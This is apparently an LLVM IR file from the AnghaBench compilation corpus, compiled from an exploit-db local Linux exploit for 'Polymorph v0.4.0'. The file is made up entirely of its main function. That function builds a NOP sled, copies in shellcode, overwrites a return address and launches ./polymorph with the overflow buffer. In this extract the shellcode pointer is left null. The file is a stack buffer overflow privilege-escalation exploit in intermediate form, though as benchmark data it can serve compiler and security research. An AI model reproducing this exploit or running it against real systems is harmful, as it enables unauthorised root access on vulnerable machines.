; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22633.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22633.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shellcode = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [33 x i8] c"\0APolymorph v0.4.0 local exploit\0A\00", align 1
@.str.1 = private unnamed_addr constant [63 x i8] c"---------------------------------------- demz @ c-code.net --\0A\00", align 1
@.str.2 = private unnamed_addr constant [12 x i8] c"./polymorph\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"polymorph\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"-f\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca [2076 x i8], align 16
  %4 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i64 3221222384, i64* %2, align 8
  store i32 0, i32* %4, align 4
  %5 = getelementptr inbounds [2076 x i8], [2076 x i8]* %3, i64 0, i64 0
  %6 = call i32 @memset(i8* %5, i32 144, i32 2076)
  br label %7

7:                                                ; preds = %23, %0
  %8 = load i32, i32* %4, align 4
  %9 = load i8*, i8** @shellcode, align 8
  %10 = call i32 @strlen(i8* %9)
  %11 = sub nsw i32 %10, 1
  %12 = icmp slt i32 %8, %11
  br i1 %12, label %13, label %26

13:                                               ; preds = %7
  %14 = load i8*, i8** @shellcode, align 8
  %15 = load i32, i32* %4, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i8, i8* %14, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = load i32, i32* %4, align 4
  %20 = add nsw i32 1000, %19
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [2076 x i8], [2076 x i8]* %3, i64 0, i64 %21
  store i8 %18, i8* %22, align 1
  br label %23

23:                                               ; preds = %13
  %24 = load i32, i32* %4, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %4, align 4
  br label %7

26:                                               ; preds = %7
  %27 = load i64, i64* %2, align 8
  %28 = and i64 %27, 255
  %29 = trunc i64 %28 to i8
  %30 = getelementptr inbounds [2076 x i8], [2076 x i8]* %3, i64 0, i64 2076
  store i8 %29, i8* %30, align 4
  %31 = load i64, i64* %2, align 8
  %32 = and i64 %31, 65280
  %33 = lshr i64 %32, 8
  %34 = trunc i64 %33 to i8
  %35 = getelementptr inbounds [2076 x i8], [2076 x i8]* %3, i64 0, i64 2077
  store i8 %34, i8* %35, align 1
  %36 = load i64, i64* %2, align 8
  %37 = and i64 %36, 16711680
  %38 = lshr i64 %37, 16
  %39 = trunc i64 %38 to i8
  %40 = getelementptr inbounds [2076 x i8], [2076 x i8]* %3, i64 0, i64 2078
  store i8 %39, i8* %40, align 2
  %41 = load i64, i64* %2, align 8
  %42 = and i64 %41, 4278190080
  %43 = lshr i64 %42, 24
  %44 = trunc i64 %43 to i8
  %45 = getelementptr inbounds [2076 x i8], [2076 x i8]* %3, i64 0, i64 2079
  store i8 %44, i8* %45, align 1
  %46 = getelementptr inbounds [2076 x i8], [2076 x i8]* %3, i64 0, i64 2080
  store i8 0, i8* %46, align 16
  %47 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str, i64 0, i64 0))
  %48 = call i32 @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.1, i64 0, i64 0))
  %49 = getelementptr inbounds [2076 x i8], [2076 x i8]* %3, i64 0, i64 0
  %50 = call i32 @execl(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* %49, i32* null)
  %51 = load i32, i32* %1, align 4
  ret i32 %51
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
